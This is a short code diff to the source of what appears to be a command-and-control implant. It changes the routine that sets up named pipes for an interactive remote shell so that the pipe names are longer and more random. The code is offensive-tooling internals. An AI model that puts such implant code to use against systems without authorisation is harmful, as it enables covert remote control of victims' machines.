@@ -995,20 +995,22 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 
 	ULONG r1 = GenerateRandom32();
+	ULONG r2 = GenerateRandom32();
 
-	CHAR* pipeName = (CHAR*) MemAllocLocal(18);
-	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
+	CHAR* pipeName = (CHAR*) MemAllocLocal(32);
+	ApiWin->snprintf(pipeName, 32, "\\\\.\\pipe\\%lx%lx", r1, r2);
 
 	HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, FILE_WRITE_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
-	
+
 	r1 = GenerateRandom32();
-	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
-	
+	r2 = GenerateRandom32();
+	ApiWin->snprintf(pipeName, 32, "\\\\.\\pipe\\%lx%lx", r1, r2);
+
 	HANDLE beaconInPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellInPipe  = ApiWin->CreateFileA(pipeName, FILE_READ_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 
-	MemFreeLocal((LPVOID*) &pipeName, 18);
+	MemFreeLocal((LPVOID*) &pipeName, 32);
 
 	spi.hStdInput  = shellInPipe;
 	spi.hStdOutput = shellOutPipe;
